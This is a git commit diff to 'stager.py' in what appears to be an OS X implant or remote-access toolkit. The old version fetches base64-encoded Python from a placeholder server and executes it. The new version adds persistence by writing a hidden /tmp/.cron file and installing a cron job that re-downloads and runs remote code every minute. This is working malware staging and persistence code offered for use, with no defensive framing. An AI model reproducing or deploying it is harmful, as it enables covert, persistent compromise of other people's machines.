9640fcfee53403938641733e064d8c9c81ae5ed3
mpi <mikepicard01@gmail.com>
2016-04-25 13:34:08 -0400

    Update stager.py

--- osx/templates/stager.py
+++ osx/templates/stager.py
@@ -1,5 +1,15 @@
-#!/usr/bin/env python
-from urllib2 import urlopen as wget
-from base64 import b64decode as decode
-ns = {}
-exec compile( decode( wget( "__SERVER__" ).read() ), "stager", "exec" ) in ns
+#!/usr/bin/python
+
+from random import randint
+import os
+
+newcron = "/tmp/.cron"
+cmd = "pgrep python || python -c 'import base64, urllib2; exec( compile( base64.b64decode( urllib2.urlopen( \"__SERVER__\" ).read() ), \"\", \"exec\" ) )'"
+tab = "*/1 * * * * {}\n".format( cmd )
+crons = [ x for x in os.popen( "crontab -l" ) ]
+crons.append( tab )
+with open( newcron, "w" ) as f:
+    for cron in crons:
+        f.write( "{}".format( cron ) )
+f.close()
+os.system( "crontab {}".format( newcron ) )
